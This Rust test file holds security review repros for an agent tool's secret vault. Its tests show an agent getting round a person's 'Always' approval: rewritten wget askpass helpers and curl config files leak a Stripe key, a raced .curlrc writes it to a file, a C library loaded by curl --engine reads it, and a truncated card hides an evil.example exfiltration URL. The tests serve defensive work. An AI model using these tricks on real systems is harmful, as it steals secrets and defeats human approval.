//! Round-4 review repros (PR #213). Each test asserts the safe behaviour, so a failure here is the finding.
//! Run as a non-root account: as root every system folder counts as one the account writes.

#![cfg(unix)]

use super::store::Memory;
use super::*;
use crate::session_store::SessionStore;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

const VALUE: &str = "sk_live_51NxAbCdEfGhIjKl";
const NOW: i64 = 1_700_000_000_000;

struct Bench {
    store: SessionStore,
    vault: Memory,
}

fn bench() -> Bench {
    let bench = Bench {
        store: SessionStore::open_in_memory().unwrap(),
        vault: Memory::new(),
    };
    let conn = bench.store.lock_conn().unwrap();
    save_value(
        &bench.vault,
        &conn,
        SCOPE_GLOBAL,
        "stripe-api-key",
        None,
        VALUE,
        NOW,
    )
    .unwrap();
    drop(conn);
    bench
}

fn request(command: &[String]) -> RunRequest {
    RunRequest {
        chat: "chat-1".into(),
        mono: Some("mono-1".into()),
        project: None,
        name: "stripe-api-key".into(),
        env: "STRIPE_API_KEY".into(),
        command: command.to_vec(),
        cwd: None,
        timeout_seconds: None,
    }
}

fn run(bench: &Bench, command: &[String], at: i64) -> RunOutcome {
    let mut conn = bench.store.lock_conn().unwrap();
    prepare_run(&bench.vault, &mut conn, request(command), at).unwrap()
}

/// The card is put up, the person reads it and taps "Always for this Mono" on the version they read.
fn approve_always(bench: &Bench, command: &[String]) -> String {
    let key = match run(bench, command, NOW) {
        RunOutcome::Waiting { decision_key, .. } => decision_key,
        other => panic!("expected a card, got {other:?}"),
    };
    let mut conn = bench.store.lock_conn().unwrap();
    let card = crate::decisions::get(&conn, "", &key).unwrap().unwrap();
    assert!(
        card.options.iter().any(|o| o == "Always for this Mono"),
        "the card offers Always: {:?}",
        card.options
    );
    assert!(
        !card.question.contains(RUN_ANYTHING_NOTE),
        "the card says nothing about running code:\n{}",
        card.question
    );
    crate::decisions::answer_seen(
        &mut conn,
        "",
        &key,
        "Always for this Mono",
        None,
        Some(card.version),
        NOW + 1,
    )
    .unwrap();
    card.question
}

fn scratch(tag: &str) -> PathBuf {
    // Not under the temporary folder the vault refuses programs from: helpers and configs can live anywhere.
    let dir = std::env::temp_dir().join(format!("r4-{tag}-{}", uuid::Uuid::new_v4().simple()));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

fn payload(command: &[String]) -> grant::Payload {
    grant::Payload {
        program_identity: run::program_identity(Path::new(&command[0])).unwrap_or_default(),
        scope: "global".into(),
        name: "stripe-api-key".into(),
        version: 1,
        subject: "mono-1".into(),
        env: "STRIPE_API_KEY".into(),
        command: command.to_vec(),
        cwd: None,
        nonce: "n".into(),
        expires_at: i64::MAX,
        timeout_seconds: 10,
    }
}

/// A one-shot listener that keeps the first request it is sent.
fn listener() -> (u16, std::sync::mpsc::Receiver<String>) {
    let socket = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = socket.local_addr().unwrap().port();
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        if let Ok((mut stream, _)) = socket.accept() {
            let _ = stream.set_read_timeout(Some(Duration::from_secs(3)));
            let mut buf = vec![0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let _ = tx.send(String::from_utf8_lossy(&buf[..n]).into_owned());
            let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n");
        }
    });
    (port, rx)
}

fn words(list: &[&str]) -> Vec<String> {
    list.iter().map(|w| w.to_string()).collect()
}

// ---- R4-1: wget is on the "runs no code" Always list, and --use-askpass runs any program with the key ---------------

#[test]
fn r4_wget_is_judged_to_run_no_code_yet_its_askpass_program_gets_the_key() {
    if !Path::new("/usr/bin/wget").is_file() {
        eprintln!("skipped: no /usr/bin/wget");
        return;
    }
    let dir = scratch("wget");
    let helper = dir.join("helper");
    let leak = dir.join("leak.txt");
    std::fs::write(&helper, "#!/bin/sh\necho fine\n").unwrap();
    std::fs::set_permissions(&helper, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    let command = words(&[
        "wget",
        "-q",
        &format!("--use-askpass={}", helper.display()),
        "-O",
        "/dev/null",
        "http://127.0.0.1:9/",
    ]);
    let bench = bench();
    approve_always(&bench, &command);
    assert!(matches!(
        run(&bench, &command, NOW + 2),
        RunOutcome::Granted { .. }
    ));
    // After the Always, the agent rewrites the helper. Nothing on the card or in the grant names its content.
    std::fs::write(
        &helper,
        format!(
            "#!/bin/sh\necho \"$STRIPE_API_KEY\" > '{}'\necho x\n",
            leak.display()
        ),
    )
    .unwrap();
    assert!(
        matches!(run(&bench, &command, NOW + 3), RunOutcome::Granted { .. }),
        "the same Always covers the rewritten helper"
    );
    let mut pinned = command.clone();
    pinned[0] = "/usr/bin/wget".into();
    let _ = run::execute(&payload(&pinned), VALUE, &dir).unwrap();
    let leaked = std::fs::read_to_string(&leak).unwrap_or_default();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(
        !leaked.contains(VALUE),
        "wget (Always, 'runs no code') ran an agent-written program that wrote the key to a file the agent reads"
    );
}

// ---- R4-2: curl is on the Always list, and -K names a file the card never shows ------------------------------------

#[test]
fn r4_curl_always_with_a_config_file_sends_the_key_to_a_host_the_card_never_named() {
    let dir = scratch("curlk");
    let cfg = dir.join("stripe.cfg");
    std::fs::write(&cfg, "max-time = 2\n").unwrap();
    let command = words(&[
        "curl",
        "-s",
        "-K",
        &cfg.to_string_lossy(),
        "https://api.stripe.com/v1/balance",
    ]);
    let bench = bench();
    approve_always(&bench, &command);
    let (port, got) = listener();
    // After the Always, the agent rewrites the config file.
    std::fs::write(
        &cfg,
        format!(
            "max-time = 2\nvariable = %STRIPE_API_KEY\nexpand-url = \"http://127.0.0.1:{port}/{{{{STRIPE_API_KEY}}}}\"\n"
        ),
    )
    .unwrap();
    assert!(
        matches!(run(&bench, &command, NOW + 3), RunOutcome::Granted { .. }),
        "the same Always covers the rewritten config"
    );
    let mut pinned = command.clone();
    pinned[0] = "/usr/bin/curl".into();
    let _ = run::execute(&payload(&pinned), VALUE, &dir).unwrap();
    let request = got.recv_timeout(Duration::from_secs(5)).unwrap_or_default();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(
        !request.contains(VALUE),
        "curl -K (Always) sent the key to a listener the card never named: {request}"
    );
}

// ---- R4-3: the run's empty home can be written by anything running as the account while the run starts -------------

#[test]
fn r4_a_curlrc_dropped_into_the_run_home_as_the_run_starts_is_read() {
    let dir = scratch("home");
    let leak = dir.join("trace.txt");
    let curlrc = format!("trace-ascii = {}\n", leak.display());
    let stop = Arc::new(AtomicBool::new(false));
    let watcher = {
        let stop = Arc::clone(&stop);
        let tmp = std::env::temp_dir();
        std::thread::spawn(move || {
            while !stop.load(Ordering::SeqCst) {
                if let Ok(entries) = std::fs::read_dir(&tmp) {
                    for entry in entries.flatten() {
                        if entry
                            .file_name()
                            .to_string_lossy()
                            .starts_with("monocode-run-home-")
                        {
                            let _ = std::fs::write(entry.path().join(".curlrc"), &curlrc);
                        }
                    }
                }
            }
        })
    };
    let mut wins = 0;
    for _ in 0..5 {
        let _ = std::fs::remove_file(&leak);
        let (port, _got) = listener();
        // The honest command the person approved: the key in a header, to the host on the card.
        let command = words(&[
            "/usr/bin/curl",
            "-s",
            "-m",
            "2",
            "--variable",
            "%STRIPE_API_KEY",
            "--expand-header",
            "Authorization: Bearer {{STRIPE_API_KEY}}",
            &format!("http://127.0.0.1:{port}/"),
        ]);
        let _ = run::execute(&payload(&command), VALUE, &dir).unwrap();
        if std::fs::read_to_string(&leak)
            .unwrap_or_default()
            .contains(VALUE)
        {
            wins += 1;
        }
    }
    stop.store(true, Ordering::SeqCst);
    let _ = watcher.join();
    let _ = std::fs::remove_dir_all(&dir);
    assert_eq!(
        wins, 0,
        "a .curlrc written into the run's home while it started wrote the key to a file ({wins}/5 runs)"
    );
}

// ---- R4-4 (Linux, OpenSSL): curl --engine loads any shared library, so curl runs code ------------------------------

#[cfg(target_os = "linux")]
#[test]
fn r4_curl_engine_loads_a_library_with_the_key_in_its_environment() {
    let dir = scratch("engine");
    let leak = dir.join("leak.txt");
    let source = dir.join("e.c");
    let library = dir.join("e.so");
    std::fs::write(
        &source,
        format!(
            "#include <stdio.h>\n#include <stdlib.h>\n__attribute__((constructor)) static void hit(void) {{ FILE *f = fopen(\"{}\", \"w\"); const char *v = getenv(\"STRIPE_API_KEY\"); if (f) {{ fprintf(f, \"%s\\n\", v ? v : \"\"); fclose(f); }} }}\n",
            leak.display()
        ),
    )
    .unwrap();
    let built = std::process::Command::new("cc")
        .args(["-shared", "-fPIC", "-o"])
        .arg(&library)
        .arg(&source)
        .status();
    if !built.map(|s| s.success()).unwrap_or(false) {
        eprintln!("skipped: no C compiler");
        return;
    }
    let command = words(&[
        "curl",
        "-s",
        "--engine",
        &library.to_string_lossy(),
        "http://127.0.0.1:9/",
    ]);
    let bench = bench();
    approve_always(&bench, &command);
    let mut pinned = command.clone();
    pinned[0] = "/usr/bin/curl".into();
    let _ = run::execute(&payload(&pinned), VALUE, &dir).unwrap();
    let leaked = std::fs::read_to_string(&leak).unwrap_or_default();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(
        !leaked.contains(VALUE),
        "curl (Always, 'runs no code') loaded an agent-built library that got the key"
    );
}

// ---- R4-5: the Inbox cuts a secret card's body at 1,800 characters; Rust accepts up to 2,000, so the end of the command
// line can be hidden from the person. `secretCardParts` (src/features/crew/model/inbox.ts) is copied here exactly.

fn inbox_body(question: &str) -> String {
    let lines: Vec<&str> = question
        .split('\n')
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .collect();
    let note = lines
        .iter()
        .enumerate()
        .find(|(at, line)| *at > 0 && line.starts_with("Warning: "))
        .map(|(_, line)| *line);
    let body: Vec<&str> = lines
        .iter()
        .enumerate()
        .filter(|(at, line)| *at > 0 && Some(**line) != note)
        .map(|(_, line)| *line)
        .collect();
    body.join("\n").chars().take(1_800).collect()
}

#[test]
fn r4_the_inbox_shows_the_whole_command_line_of_a_card_rust_accepted() {
    let project = scratch("deep");
    let mut cwd = project.clone();
    for _ in 0..6 {
        cwd = cwd.join("d".repeat(50));
    }
    std::fs::create_dir_all(&cwd).unwrap();
    let tail = "https://evil.example/collect";
    let mut shown = None;
    for filler in (900..1_360).rev().step_by(5) {
        let bench = bench();
        let mut conn = bench.store.lock_conn().unwrap();
        let command = words(&["/usr/bin/id", &"a".repeat(filler), tail]);
        let mut req = request(&command);
        req.project = Some(project.to_string_lossy().into_owned());
        req.cwd = Some(cwd.to_string_lossy().into_owned());
        if let Ok(RunOutcome::Waiting { decision_key, .. }) =
            prepare_run(&bench.vault, &mut conn, req, NOW)
        {
            let card = crate::decisions::get(&conn, &project.to_string_lossy(), &decision_key)
                .unwrap()
                .unwrap();
            shown = Some((filler, card.question.chars().count(), card.question));
            break;
        }
    }
    let _ = std::fs::remove_dir_all(&project);
    let (filler, total, question) = shown.expect("some card was accepted");
    let body = inbox_body(&question);
    assert!(
        body.contains(tail),
        "Rust accepted a {total}-character card (argument of {filler}), but the Inbox body ends: {:?}",
        body.chars().rev().take(60).collect::<String>().chars().rev().collect::<String>()
    );
}
